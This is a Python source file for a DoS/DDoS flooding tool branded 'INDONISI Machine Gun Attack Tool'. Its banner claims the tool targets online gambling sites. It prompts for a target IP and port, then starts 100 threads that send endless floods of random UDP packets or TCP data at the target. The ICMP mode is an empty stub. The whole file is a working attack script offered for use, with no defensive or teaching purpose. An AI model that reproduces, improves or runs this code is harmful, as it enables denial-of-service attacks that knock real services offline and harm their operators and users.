import os
import sys
import subprocess
import socket
import threading
import time
import random
from termcolor import colored

def hacker_arka_plan():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;32;40m") 
    
    # ASCII Art 
    ascii_art = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⡼⠀⢀⡀⣀⢱⡄⡀⠀⠀⠀⢲⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣰⣿⣿⣿⣻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⢋⣼⣿⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """
    print(colored(ascii_art, "green", attrs=["bold"]))
    
   
    print(colored("="*40, "green", attrs=["bold"]))
    print(colored("      INDONISI DOS/DDOS TOOL          ", "yellow", attrs=["bold"]))
    print(colored("          Creator: PYSCODES       ", "cyan", attrs=["bold"]))
    print(colored("    Support : https://linktr.ee/pyscodes      ", "cyan", attrs=["bold"]))
    print(colored("    contact : https://instagram.com/pyscodes       ", "cyan", attrs=["bold"]))
    print(colored("="*40, "green", attrs=["bold"]))
    print(colored("   INDONISI Machine Gun Attack Tool   ", "cyan", attrs=["bold"]))
    print(colored("="*40, "green", attrs=["bold"]))
    print(colored("⚠  I DELIBERATELY MADE THIS TOOL TO ERADICATE ONLINE GAMBLING WEBSITES, OTHER THAN THAT I AM NOT RESPONSIBLE.⚠", "red", attrs=["bold"]))

def ping_kontrol(target_ip):
    try:
        response = subprocess.run(["ping", "-c", "1", target_ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if response.returncode == 0:
            print(colored("Target is active", "green"))
            return True
        else:
            print(colored("Target is inactive", "red"))
            return False
    except Exception as e:
        print(colored(f"Ping operation failed: {e}", "red"))
        return False


class PaketDurumu:
    def __init__(self):
        self.sent = 0
        self.failed = 0
        self.lock = threading.Lock()

    def update(self, success):
        with self.lock:
            if success:
                self.sent += 1
            else:
                self.failed += 1

    def rate(self):
        with self.lock:
            total = self.sent + self.failed
            return (self.sent / total) * 100 if total > 0 else 0

def attack(target_ip, target_port, paket_durumu, attack_type="udp", timeout=5):
    try:
        if attack_type == "udp":
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while True:
                sock.sendto(random._urandom(1024), (target_ip, target_port))
                paket_durumu.update(True)
        elif attack_type == "tcp":
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            while True:
                sock.send(random._urandom(1024))
                paket_durumu.update(True)
        elif attack_type == "icmp":
            # Handle ICMP attack
            pass
        # Add more attack types if needed
    except Exception as e:
        paket_durumu.update(False)
        print(f"Attack error: {e}")

def main():
    hacker_arka_plan()

    target_ip = input(colored("Enter Target IP or Domain: ", "yellow"))
    if target_ip == "127.0.0.1":
        print(colored("Cannot attack local IP (127.0.0.1). Exiting.", "red"))
        sys.exit(1)

    target_port = int(input(colored("Enter Target Port (e.g., 80): ", "yellow")))
    attack_type = input(colored("Enter attack type (tcp/udp/icmp): ", "yellow")).lower()

    paket_durumu = PaketDurumu()

    if ping_kontrol(target_ip):
        # Start attack in separate threads
        for _ in range(100):  # Number of threads
            t = threading.Thread(target=attack, args=(target_ip, target_port, paket_durumu, attack_type))
            t.start()

if __name__ == "__main__":
    main()
